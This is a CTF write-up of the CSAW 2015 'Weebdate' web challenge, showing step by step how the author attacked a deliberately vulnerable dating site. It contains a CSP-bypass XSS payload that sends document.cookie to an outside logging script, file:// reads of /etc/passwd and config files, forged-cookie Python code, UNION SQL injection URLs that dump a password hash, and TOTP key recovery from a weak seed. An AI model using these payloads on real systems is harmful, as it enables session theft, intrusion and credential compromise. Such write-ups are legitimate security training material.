---
source: zlz-buerhaus
source_url: https://buer.haus/2015/09/20/csaw-2015-web-500-weebdate-writeup/
title: "CSAW 2015 – Web 500 (Weebdate) Writeup | ziot"
---

[< Back](https://buer.haus/)

**Challenge Info**

- CTF: [CSAW 2015](https://ctf.isis.poly.edu/)
- Challenge: Weebdate
- Category: Web
- Points: 500

**Challenge Description**

```
    Since the Ashley Madison hack, a lot of high profile socialites have scrambled to find the hottest new dating sites. Unfortunately for us, that means they're taking more safety measures and only using secure websites. We have some suspicions that Donald Trump is using a new dating site called "weebdate" and also selling cocaine to fund his presidential campaign. We need you to get both his password and his 2 factor TOTP key so we can break into his profile and investigate.

    Flag is md5($totpkey.$password)

    http://54.210.118.179/
```

**Website Screenshot**

[![WeebDate](https://buer.haus/wp-content/uploads/2015/09/1-300x194.png)](https://buer.haus/wp-content/uploads/2015/09/1.png)

**Writeup**

When you first visit the website, you can only access a login and registration page. Registering an account gives you a 2-factor TOTP key. The QR code or key can be used with an application that supports TOTP authentication such as the Google Authenticator app.

[![2](https://buer.haus/wp-content/uploads/2015/09/2-300x194.png)](https://buer.haus/wp-content/uploads/2015/09/2.png)

**QR Code example:** [http://api.qrserver.com/v1/create-qr-code/?data=otpauth://totp/11234asdf?secret=Z5LVKUKDJ6P3JTEC&size=220x220&margin=0](http://api.qrserver.com/v1/create-qr-code/?data=otpauth://totp/11234asdf?secret=Z5LVKUKDJ6P3JTEC&size=220x220&margin=0)

After logging into the website, the first thing I want to do is start looking at how it handles authentication. When a user logs into an account, a "session" cookie is created. Sometimes you can tell the infrastructure the server is running on based on the name or value format of the cookie. For example, PHPSESSIONID is a pretty big tell that the server is running on PHP and using PHP's normal built-in session handling. This cookie appears to be a custom format, so it's likely part of the challenge.

My session cookie:

[![cookie](https://buer.haus/wp-content/uploads/2015/09/cookie-300x48.png)](https://buer.haus/wp-content/uploads/2015/09/cookie.png)

- The cookie is a string separated by two \_'s.
- My username is 5, but 5 could be anything. I created a new account just to verify that the first part of the cookie is username.
- The second part of the string is an EPOCH/Unix timestamp from when I logged in.
- The third part is some sort of encrypted string, probably SHA or MD5.

The first thing I tried is changing "5" to "donaldtrump". After refreshing the index page, I noticed I was logged in as donaldtrump. Victory! What an easy challenge! As soon as I tried to load any other page, it booted me back to the login. After trying a few things on the cookie such as SQLI and other common application attacks, I knew it was time to move on and explore the rest of the website.

Looking at the rest of the site, there are only a handful of pages:

- Home/Index
- Search for users
- View/Send private messages
- Edit profile

I searched for a user 'donaldtrump' and came across his profile:

[http://54.210.118.179/user/donaldtrump](http://54.210.118.179/user/donaldtrump)

[![3](https://buer.haus/wp-content/uploads/2015/09/3-300x194.png)](https://buer.haus/wp-content/uploads/2015/09/3.png)

Knowing I can send him a private message, I decided to do that first.

[![4](https://buer.haus/wp-content/uploads/2015/09/4-300x194.png)](https://buer.haus/wp-content/uploads/2015/09/4.png)

The server is responding with a Content Security Policy (CSP) security header, so I figured the challenge involved getting around the CSP rules and forcing someone to execute a Cross-Site Scripting (XSS) payload.

[![6](https://buer.haus/wp-content/uploads/2015/09/6-300x78.png)](https://buer.haus/wp-content/uploads/2015/09/6.png)

This means you are unable to execute any JavaScript that isn't in a .js file that is either already on the server or on apis.google.com. Any CSP violations get reported to http://54.210.118.179/csp/violate.

Just to check it out, I sent the message with a basic <script>alert('xss');</script> payload to see if it was even vulnerable to XSS:

[![5](https://buer.haus/wp-content/uploads/2015/09/5-300x194.png)](https://buer.haus/wp-content/uploads/2015/09/5.png)

Sure enough, it is vulnerable to XSS. And not to my surprise, the CSP rules are blocking the payload from executing. I recognized this CSP rule from a Cure53 CSP bypass challenge and was able to find a payload to bypass it.

[https://github.com/cure53/XSSChallengeWiki/wiki/H5SC-Minichallenge-3:-%22Sh\*t,-it's-CSP!%22](https://github.com/cure53/XSSChallengeWiki/wiki/H5SC-Minichallenge-3:-%22Sh*t,-it's-CSP!%22)

Using one of the solves submitted by the H5SC Minichallenge 3, I was able to construct a payload that utilized the googleapis.com CSP rule:

```

"><embed src='//ajax.googleapis.com/ajax/libs/yui/2.8.0r4/build/charts/assets/charts.swf?allowedDomain=\"})))}catch(e){document.write%28%27%3Cimg%20src%3D%22[redacted]%2fctflog.php%3Fcookie%3D%27%2bdocument.cookie%2b%27%22%20%2f%3E%27%29%3B}//' allowscriptaccess=always>
```

My mistake at this point was assuming XSS was part of this challenge. After I sent the private message, no one ever loaded it. I should have verified that part first.

Moving on from private messages, I looked at the edit profile page.

[![7](https://buer.haus/wp-content/uploads/2015/09/7-300x194.png)](https://buer.haus/wp-content/uploads/2015/09/7.png)

There's a user icon form that allows you to input an image URL. The server saves the URL you supply. The image is not getting processed or uploaded to the server. I decided to put in a logging script just to see if there is a bot scanning for changes on the user search page.

I ended up getting a result and I was actually surprised by this:

```

[September 18, 2015, 8:54 pm]: identity -- mrzioto.com -- close -- Python-urllib/2.7 -- /usr/local/bin:/usr/bin:/bin -- <address>Apache/2.2.14 (Ubuntu) Server at [redacted]</address>
 -- [redacted] -- [redacted] -- [redacted] -- 80 -- 54.210.118.179 -- [redacted] -- [redacted] -- [redacted]/ctflog.php -- 38626 -- CGI/1.1 -- HTTP/1.1 -- GET -- test=1 -- /[redacted]/ctflog.php?test=1 -- /[redacted]/ctflog.php -- /[redacted]/ctflog.php -- 1442634860 || GET: 1 || POST:
```

Seeing that the script loading the URL is using Python's module [urllib](https://docs.python.org/2/library/urllib.html), I started to mess with the uri protocol file://. Although I initially failed, I was getting error messages that showed me I was on the right path.

[![8](https://buer.haus/wp-content/uploads/2015/09/8-300x194.png)](https://buer.haus/wp-content/uploads/2015/09/8.png)

Looking at the [urllib spec](https://docs.python.org/2/library/urllib.html#urllib.urlopen), the first arg is netloc, so I need to first supply a URL:

file://localhost:/etc/passwd

[![9](https://buer.haus/wp-content/uploads/2015/09/9-300x194.png)](https://buer.haus/wp-content/uploads/2015/09/9.png)

Success!

Now that I have a local file include (LFI) vulnerability, I need to start guessing for files containing information to move forward. A good starting point is getting the website source code. Knowing that it is probably a Python web service, I need to locate the folder containing the Python web service script and the script's name.

There may have been an easier way to do this, but I tried a bunch of common file location and names until I found this:

file://localhost:/etc/apache2/sites-enabled/000-default.conf

```

    <VirtualHost *>
        WSGIScriptAlias / /var/www/application.wsgi
        <Directory /var/www/weeb>
            WSGIProcessGroup application
            WSGIApplicationGroup %{GLOBAL}
            Allow from all
        </Directory>
    </VirtualHost>
```

This lead me to **/var/www/weeb** and I eventually guessed the server.py file:

[file://localhost:/var/www/weeb/server.py](http://pastebin.com/TX7KymxU)

[![10](https://buer.haus/wp-content/uploads/2015/09/10-300x194.png)](https://buer.haus/wp-content/uploads/2015/09/10.png)

From here I went through the source code looking for the flag, additional file names, and new application vulnerabilities. What I learned:

- The Python server is using Flask.
- A lot of the important logic is in a file named [util.py](http://pastebin.com/HERhxFXh).
- All SQL queries seem to be parameterized correctly.
- The [settings.py](http://pastebin.com/tj7Z5ps1) file contains MySQL database credentials and a cookie secret probably used in an HMAC encryption
- The third part of the session cookie is a SHA1 HMAC using the cookie secret on the username\_timestamp at the beginning of the cookie.

I put together the necessary code to generate a valid cookie for the donaldtrump user:

```

    import time, hashlib, hmac
    def make_cookie(secret, username, ip, timestamp=None):
        if not timestamp:
            timestamp = int(time.time())
        base_cookie = '%s_%s' % (username, str(timestamp))
        hmac_builder = hmac.new(secret, digestmod=hashlib.sha1)
        hmac_builder.update(base_cookie)
        return '%s_%s' % (base_cookie, hmac_builder.hexdigest())
    cookie = make_cookie("98y0etw4skehjvb", "donaldtrump" "", "1442643467")
    print cookie
```

Output: donaldtrump\_1442643483\_419df73d2a2cc5a6e733796fad98447423e0eb7f

[![11](https://buer.haus/wp-content/uploads/2015/09/11-300x194.png)](https://buer.haus/wp-content/uploads/2015/09/11.png)

Good news, I'm in! Bad news, there's no flag to be found.

Knowing that there is no reference to a flag and I haven't discovered a secret file on the server, it appeared I only have two options left. Look through the template files and try to get access to the database. I quickly discovered the template files contained nothing interesting, so that left me with getting access to the database.

Earlier when I was looking for the source code paths, I checked if I had permission to access the MySQL database files and I did not. That means the only option left is code injection or a SQL injection. I decided to look for a SQL injection first by reviewing the source code I collected.

After reading through all of the queries on the util.py file, I came across a single oddity that stood out:

```

    util.py
        def get_csp_report(report_id):
            cursor = mysql.connection.cursor()
            cursor.execute(
                "select * from reports where report_id = %s"%
                (report_id,)
            )
```

There's a function for getting the CSP violation reports. I had not seen this endpoint when I first went through the website. If you look closely at the code, instead of having a comma to delegate the parameterized value, there's a **%** symbol. This one character mistake makes it vulnerable to a SQL injection attack.

Looking at the server.py for the relevant endpoint, I now have everything I need:

```

    server.py
        @app.route("/csp/view/")
        def csp_view(report_id):
            return Response(repr(utils.get_csp_report(report_id)), mimetype="text/json")
```

[http://54.210.118.179/csp/view/1](http://54.210.118.179/csp/view/1)

The server returns a JSON file containing data of the CSP violation. One thing I would like to note at this point is that you would have been able to find this without source code access. When you violate the CSP rules, such as when I sent <script> tags in private messages, you will trigger a CSP violation. Because this server is configured to send violations to a specific endpoint, I should have monitored my traffic to see what it is sending and responding with. If you look at the code:

```

    server.py
        @app.route("/csp/violate", methods=["GET", "POST"])
        def csp_violate():
            report_id = utils.insert_csp_report(request.remote_addr, request.data)
            message_body = {"message": "Thoroughly violated, thanks", "view_url":"/csp/view/"+str(report_id)}
            return Response(repr(message_body), mimetype="text/json")
```

Even a simple GET request to this endpoint will return with the information you need:

[http://54.210.118.179/csp/violate](http://54.210.118.179/csp/violate)

```
{'view_url': '/csp/view/3199', 'message': 'Thoroughly violated, thanks'}
```

From there I should have looked at /csp/view/\[int\] and checked for SQL injection. This is a valuable lesson for web bounty hunters and professional application pen. testers. CSP violation reporting is an additional endpoint that is worth exploring for vulnerabilities.

Moving on -- a simple test reveals that it is indeed vulnerable to SQLi.

[http://54.210.118.179/csp/view/-1](http://54.210.118.179/csp/view/-1) returns with "None".

Result: None

[http://54.210.118.179/csp/view/-1 or 1=1](http://54.210.118.179/csp/view/-1%20or%201=1) returns with a result:

```
{'report_ip': u'[redacted]', 'report_content': u'{"csp-report":{"document-uri":"http://54.210.118.179/","referrer":"","violated-directive":"script-src \'self\' https://apis.google.com","effective-directive":"script-src","original-policy":"script-src \'self\' https://apis.google.com; report-uri /csp/violate","blocked-uri":"","status-code":200}}', 'report_id': 3L}
```

[http://54.210.118.179/csp/view/-1 union select 1,2,3](http://54.210.118.179/csp/view/-1%20union%20select%201,2,3) returns with:

```
{'report_ip': u'2', 'report_content': u'3', 'report_id': 1L}
```

I don't have a lot of information on the database because I can only see some column and table names from the Python server code. I know it's using MySQL, so if I have access to the right permissions and the information\_schema database, I should be able to collect all the information I need.

[http://54.210.118.179/csp/view/-1 union select schema\_name,2,3 from information\_schema.schemata](http://54.210.118.179/csp/view/-1%20union%20select%20schema_name,2,3%20from%20information_schema.schemata)

```
{'report_ip': u'2', 'report_content': u'3', 'report_id': u'information_schema'}
```

I can now enumerate queries one result at a time. This is the part where most people run sqlmap, but I figure it's probably unnecessary and overkill for this CTF challenge.

**Schemas:**

[http://54.210.118.179/csp/view/-1 union select schema\_name,2,3 from information\_schema.schemata where schema\_name not in('information\_schema','weeb')](http://54.210.118.179/csp/view/-1%20union%20select%20schema_name,2,3%20from%20information_schema.schemata%20where%20schema_name%20not%20in('information_schema','weeb'))

**weeb schema tables:**

[http://54.210.118.179/csp/view/-1 union select table\_name,2,3 from information\_schema.tables where table\_schema='weeb' and table\_name not in('messages','reports','users')](http://54.210.118.179/csp/view/-1%20union%20select%20table_name,2,3%20from%20information_schema.tables%20where%20table_schema='weeb'%20and%20table_name%20not%20in('messages','reports','users'))

**user table columns:**

[http://54.210.118.179/csp/view/-1 union select column\_name,2,3 from information\_schema.columns where table\_schema='weeb' and table\_name='users' and column\_name not in('user\_id','user\_name','user\_password','user\_ip','user\_image','user\_credits','user\_register\_time','user\_profile')](http://54.210.118.179/csp/view/-1%20union%20select%20column_name,2,3%20from%20information_schema.columns%20where%20table_schema='weeb'%20and%20table_name='users'%20and%20column_name%20not%20in('user_id','user_name','user_password','user_ip','user_image','user_credits','user_register_time','user_profile'))

Now I can paint a pretty picture:

- weeb
  - messages
  - reports
  - users
    - user\_id
    - user\_name
    - user\_password
    - user\_ip
    - user\_image
    - user\_credits
    - user\_register\_time
    - user\_profile

Now to collect information on donaldtrump:

[http://54.210.118.179/csp/view/-1 union select concat(user\_id,user\_name,user\_password,user\_ip,user\_image,user\_credits,user\_register\_time,user\_profile),null,null from weeb.users where user\_name='donaldtrump'](http://54.210.118.179/csp/view/-1%20union%20select%20concat(user_id,user_name,user_password,user_ip,user_image,user_credits,user_register_time,user_profile),null,null%20from%20weeb.users%20where%20user_name='donaldtrump')

```
{'report_ip': None, 'report_content': None, 'report_id': u'5donaldtrump22e59a7a2792b25684a43d5f5229b2b5caf7abf8fa9f186249f35cae53387fa364.124.192.210http://i.imgur.com/XBdz9ay.png00WE SHALL NOT SAY'}
```

Formatted:

- user\_id: 5
- user\_name: donaldtrump
- user\_password: 22e59a7a2792b25684a43d5f5229b2b5caf7abf8fa9f186249f35cae53387fa3
- user\_ip: 64.124.192.210
- user\_image: http://i.imgur.com/XBdz9ay.png
- user\_credits: 0
- user\_register\_time: 0
- user\_profile: WE SHALL NOT SAY

We have a SHA256 password hash, but I decided to look for the OTP key because I didn't want to deal with that. 🙂 Looking at how the registration works, we can see the code used to generate the random seed that gets used when creating your OTP key.

```

    server.py
        seed = utils.generate_seed(username, request.remote_addr)
        totp_key = utils.get_totp_key(seed)
        utils.register_user(username, password, request.remote_addr)
        qr_url = 'http://api.qrserver.com/v1/create-qr-code/?data=otpauth://totp/%s?secret=%s&size=220x220&margin=0'%(username, totp_key)

    util.py
        def generate_seed(username, ip_address):
            return int(struct.unpack('I', socket.inet_aton(ip_address))[0]) + struct.unpack('I', username[:4].ljust(4,'0'))[0]

        def get_totp_key(seed):
            random.seed(seed)
            return pyotp.random_base32(16, random)
```

It's using the username and the client's IP address at time of registration to generate the seed. That seed is used to generate pseudo-random numbers. As long as we have the IP address used at registration, we can get the secret OTP key. Using "donaldtrump" and "64.124.192.210" in the generate\_seed() function, we get the following output: " **5170457508**". Running it through the get\_totp\_key() function, we get the key value ' **6OIMTPLHSQ6JUKYP**'.

- TOTP Key: 6OIMTPLHSQ6JUKYP

Just for fun, here is the QR code:

![](http://api.qrserver.com/v1/create-qr-code/?data=otpauth://totp/donaldtrump?secret=6OIMTPLHSQ6JUKYP&size=220x220&margin=0)

Source: [http://api.qrserver.com/v1/create-qr-code/?data=otpauth://totp/donaldtrump?secret=6OIMTPLHSQ6JUKYP&size=220x220&margin=0](http://api.qrserver.com/v1/create-qr-code/?data=otpauth://totp/donaldtrump?secret=6OIMTPLHSQ6JUKYP&size=220x220&margin=0)

Now that we have the TOTP key, we just need the donaldtrump account's plaintext password to get the flag. I figured the sha256 hash was basic enough and ran it through the hash bruteforcer [hashcat](http://hashcat.net/oclhashcat/).

The hash format is sha256(username+password). After a little bit of time, hashcat successfully bruteforced the password hash: donaldtrumpzebra. That means donaldtrump's password is 'zebra'.

The flag format is MD5(6OIMTPLHSQ6JUKYPzebra)

Flag = **a8815ecd3c2b6d8e2e884e5eb6916900**